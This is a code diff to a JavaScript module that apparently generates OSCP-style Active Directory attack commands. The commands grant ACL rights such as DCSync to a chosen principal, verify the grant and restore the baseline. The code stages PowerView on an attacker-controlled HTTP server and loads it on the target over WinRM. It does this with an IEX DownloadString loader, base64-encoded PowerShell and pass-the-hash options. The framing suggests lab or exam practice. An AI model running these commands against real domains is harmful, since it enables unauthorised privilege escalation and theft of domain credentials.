@@ -11,20 +11,23 @@ const canonicalRight = (value) => {
 const shellQuote = (value) => `'${String(value).replaceAll("'", `'"'"'`)}'`;
 const variableValue = (variables, key) => String(variables[key] || `{{${key}}}`).trim();
 
-const principalSid = "$PrincipalSid = Get-DomainObject -Identity '{{aclPrincipal}}' -Domain '{{domain}}' -Properties objectSid | Select-Object -ExpandProperty objectSid";
-const aclQuery = "Get-DomainObjectAcl -Identity '{{aclTarget}}' -Domain '{{domain}}' -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -eq $PrincipalSid }";
+const principalSid = "$PrincipalObject = Get-DomainObject -Identity '{{aclPrincipal}}' -Domain '{{domain}}' -Properties objectSid; if (-not $PrincipalObject) { throw 'ACL principal {{aclPrincipal}} was not found in {{domain}}' }; $PrincipalSidValue = @($PrincipalObject.objectSid)[0]; if ($PrincipalSidValue -is [byte[]]) { $PrincipalSid = (New-Object System.Security.Principal.SecurityIdentifier($PrincipalSidValue, 0)).Value } elseif ($PrincipalSidValue -and $PrincipalSidValue.PSObject.Properties['Value']) { $PrincipalSid = [string]$PrincipalSidValue.Value } else { $PrincipalSid = [string]$PrincipalSidValue }; if ($PrincipalSid -notmatch '^S-1-') { throw ('ACL principal resolved to an invalid SID: ' + $PrincipalSid) }";
+const aclQuery = "Get-DomainObjectAcl -Identity '{{aclTarget}}' -Domain '{{domain}}' -ResolveGUIDs | Where-Object { $AceSid = if ($_.SecurityIdentifier -and $_.SecurityIdentifier.PSObject.Properties['Value']) { [string]$_.SecurityIdentifier.Value } else { [string]$_.SecurityIdentifier }; $AceSid -eq $PrincipalSid }";
 const baselinePath = "$BaselinePath = Join-Path $env:TEMP 'oscp-acl-before.xml'";
-const compareAcl = `$BeforeKeys = @('__ACL_BASELINE__') + @($Before | ForEach-Object { "$($_.ActiveDirectoryRights)|$($_.ObjectAceType)|$($_.AceQualifier)|$($_.IsInherited)" }); $CurrentKeys = @('__ACL_BASELINE__') + @($Current | ForEach-Object { "$($_.ActiveDirectoryRights)|$($_.ObjectAceType)|$($_.AceQualifier)|$($_.IsInherited)" }); $Diff = Compare-Object -ReferenceObject $BeforeKeys -DifferenceObject $CurrentKeys`;
+const aclColumns = "SecurityIdentifier,ActiveDirectoryRights,ObjectAceType,AceType,AceQualifier,AccessMask,IsInherited";
+const aclKey = "$AceSid = if ($_.SecurityIdentifier -and $_.SecurityIdentifier.PSObject.Properties['Value']) { [string]$_.SecurityIdentifier.Value } else { [string]$_.SecurityIdentifier }; '{0}|{1}|{2}|{3}|{4}|{5}|{6}' -f $AceSid,[string]$_.ActiveDirectoryRights,[string]$_.ObjectAceType,[string]$_.AceType,[string]$_.AceQualifier,[string]$_.AccessMask,[string]$_.IsInherited";
+const snapshot = (rows, keys) => `${keys} = @('__ACL_BASELINE__') + @(${rows} | Where-Object { $null -ne $_ } | ForEach-Object { ${aclKey} })`;
+const compareAcl = `${snapshot("$Current", "$CurrentKeys")}; $Diff = @(Compare-Object -ReferenceObject $BeforeKeys -DifferenceObject $CurrentKeys)`;
 
 const winrmIdentity = (variables) => `-d ${shellQuote(variableValue(variables, "domain"))} -u ${shellQuote(variableValue(variables, "user"))}`;
 const winrmAuth = (variables) => String(variables.password || "").trim()
   ? `-p ${shellQuote(variables.password)}`
   : `-H ${shellQuote(variableValue(variables, "hash"))}`;
 
-const powerViewHost = "pv='{{powerViewPath}}'; test -f \"$pv\" || { echo 'PowerView.ps1 was not found; update POWER VIEW PATH'; exit 1; }; mkdir -p '{{workspaceRoot}}/{{targetName}}/notes'; if ! curl -fsS --max-time 2 'http://{{lhost}}:{{powerViewPort}}/PowerView.ps1' >/dev/null 2>&1; then (cd \"$(dirname \"$pv\")\" && nohup python3 -m http.server {{powerViewPort}} --bind {{lhost}} >'{{workspaceRoot}}/{{targetName}}/notes/powerview-http.log' 2>&1 &); sleep 1; fi";
+const powerViewHost = "pv='{{powerViewPath}}'; pv_url='http://{{lhost}}:{{powerViewPort}}/PowerView.ps1'; pv_log='{{workspaceRoot}}/{{targetName}}/notes/powerview-http.log'; test -f \"$pv\" || { echo 'PowerView.ps1 was not found; update POWER VIEW PATH'; exit 1; }; mkdir -p \"$(dirname \"$pv_log\")\"; if ! curl -fsS --max-time 2 \"$pv_url\" | grep -qi 'function Get-DomainObjectAcl'; then (cd \"$(dirname \"$pv\")\" && nohup python3 -m http.server {{powerViewPort}} --bind {{lhost}} >\"$pv_log\" 2>&1 &); sleep 1; fi; curl -fsS --max-time 2 \"$pv_url\" | grep -qi 'function Get-DomainObjectAcl' || { echo \"PowerView HTTP staging failed at $pv_url; choose a free POWER VIEW HTTP PORT and inspect $pv_log\"; tail -n 20 \"$pv_log\" 2>/dev/null; exit 1; }";
 
 const remotePowerView = (script, variables) => {
-  const loader = "$ProgressPreference = 'SilentlyContinue'; IEX((New-Object Net.WebClient).DownloadString('http://{{lhost}}:{{powerViewPort}}/PowerView.ps1'))";
+  const loader = "$ErrorActionPreference = 'Stop'; $ProgressPreference = 'SilentlyContinue'; $PowerViewUrl = 'http://{{lhost}}:{{powerViewPort}}/PowerView.ps1'; try { IEX((New-Object Net.WebClient).DownloadString($PowerViewUrl)) } catch { throw ('PowerView download or load failed from ' + $PowerViewUrl + ': ' + $_.Exception.Message) }";
   const payload = shellQuote(`${loader}; ${script}`);
   return `${powerViewHost}; payload=$(printf '%s' ${payload} | iconv -f UTF-8 -t UTF-16LE | base64 -w0); nxc winrm {{rhost}} ${winrmIdentity(variables)} ${winrmAuth(variables)} -X \"powershell.exe -NoLogo -NoProfile -NonInteractive -EncodedCommand $payload\"`;
 };
@@ -40,6 +43,17 @@ export function buildAclCommands(variables = {}) {
   }
   const target = String(variables.aclTarget || "selected target").trim();
   const principal = String(variables.aclPrincipal || "selected principal").trim();
+  const validDcsyncTargets = [variables.domain, variables.baseDn]
+    .map((value) => String(value || "").trim().toLowerCase())
+    .filter(Boolean);
+  if (right === "DCSync" && variables.aclTarget && validDcsyncTargets.length
+    && !validDcsyncTargets.includes(target.toLowerCase())) {
+    return [{
+      key: "acl-invalid-dcsync-target",
+      label: "Set the DCSync ACL target to the domain object",
+      value: `printf '%s\\n' ${shellQuote(`DCSync must be granted on the domain object. Set ACL TARGET to ${variables.domain || variables.baseDn}, not ${target}.`)} >&2; false`,
+    }];
+  }
   const identity = `${right}: ${principal} -> ${target}`;
   const commands = [
     {
@@ -55,12 +69,12 @@ export function buildAclCommands(variables = {}) {
     {
       key: "acl-powerview-check",
       label: "PowerView over WinRM: confirm required functions",
-      value: remotePowerView("Get-Command Get-DomainObject,Get-DomainObjectAcl,Add-DomainObjectAcl,Remove-DomainObjectAcl | Select-Object Name,CommandType", variables),
+      value: remotePowerView("$RequiredFunctions = @('Get-DomainObject','Get-DomainObjectAcl','Add-DomainObjectAcl','Remove-DomainObjectAcl'); $MissingFunctions = @($RequiredFunctions | Where-Object { -not (Get-Command $_ -ErrorAction SilentlyContinue) }); if ($MissingFunctions.Count) { throw ('PowerView is missing required functions: ' + ($MissingFunctions -join ', ')) }; 'PowerView loaded successfully from ' + $PowerViewUrl; Get-Command $RequiredFunctions | Select-Object Name,CommandType", variables),
     },
     {
       key: "acl-capture-before",
       label: `Capture current ACL — ${identity}`,
-      value: remotePowerView(`${principalSid}; ${baselinePath}; $Before = @(${aclQuery}); Export-Clixml -InputObject $Before -Path $BaselinePath; $Before | Format-List SecurityIdentifier,ActiveDirectoryRights,ObjectAceType,AceQualifier,IsInherited`, variables),
+      value: remotePowerView(`${principalSid}; ${baselinePath}; $Before = @(${aclQuery}); ${snapshot("$Before", "$BeforeKeys")}; $BeforeKeys | Export-Clixml -Path $BaselinePath; 'Resolved principal SID: ' + $PrincipalSid; 'Captured ' + $Before.Count + ' matching ACL entries to ' + $BaselinePath; if ($Before.Count) { $Before | Select-Object ${aclColumns} | Format-Table -AutoSize } else { 'No matching ACE existed before the grant; an empty baseline is valid' }`, variables),
     },
     {
       key: "acl-grant",
@@ -70,7 +84,7 @@ export function buildAclCommands(variables = {}) {
     {
       key: "acl-verify-grant",
       label: `Review granted ACL change — ${identity}`,
-      value: remotePowerView(`${principalSid}; ${baselinePath}; $Before = @(Import-Clixml -Path $BaselinePath); $Current = @(${aclQuery}); ${compareAcl}; $Current | Format-Table SecurityIdentifier,ObjectAceType,ActiveDirectoryRights,AceQualifier -AutoSize; $Diff | Format-Table -AutoSize; if (-not $Diff) { throw 'No ACL change was detected' }`, variables),
+      value: remotePowerView(`${principalSid}; ${baselinePath}; if (-not (Test-Path $BaselinePath)) { throw ('ACL baseline was not found at ' + $BaselinePath + '; run Capture current ACL first') }; $BeforeKeys = @(Import-Clixml -Path $BaselinePath); $Current = @(${aclQuery}); ${compareAcl}; $Added = @($Diff | Where-Object SideIndicator -eq '=>'); 'Resolved principal SID: ' + $PrincipalSid; if ($Current.Count) { $Current | Select-Object ${aclColumns} | Format-Table -AutoSize } else { 'No matching ACE currently exists for the principal' }; if (-not $Added.Count) { throw 'No added ACL entry was detected relative to the captured baseline' }; 'Added normalized ACL entries:'; $Added | Format-Table InputObject,SideIndicator -AutoSize`, variables),
     },
   ];
 
@@ -108,7 +122,7 @@ export function buildAclCommands(variables = {}) {
     {
       key: "acl-verify-cleanup",
       label: `Verify ACL restoration — ${identity}`,
-      value: remotePowerView(`${principalSid}; ${baselinePath}; $Before = @(Import-Clixml -Path $BaselinePath); $Current = @(${aclQuery}); ${compareAcl}; if ($Diff) { $Diff | Format-Table -AutoSize; throw 'ACL cleanup does not match the captured baseline' } else { Remove-Item -Path $BaselinePath -Force; 'ACL cleanup matches the captured baseline' }`, variables),
+      value: remotePowerView(`${principalSid}; ${baselinePath}; if (-not (Test-Path $BaselinePath)) { throw ('ACL baseline was not found at ' + $BaselinePath + '; run Capture current ACL first') }; $BeforeKeys = @(Import-Clixml -Path $BaselinePath); $Current = @(${aclQuery}); ${compareAcl}; if ($Diff.Count) { $Diff | Format-Table InputObject,SideIndicator -AutoSize; throw 'ACL cleanup does not match the captured baseline' } else { Remove-Item -Path $BaselinePath -Force; 'ACL cleanup matches the captured baseline; removed ' + $BaselinePath }`, variables),
     },
   );
 
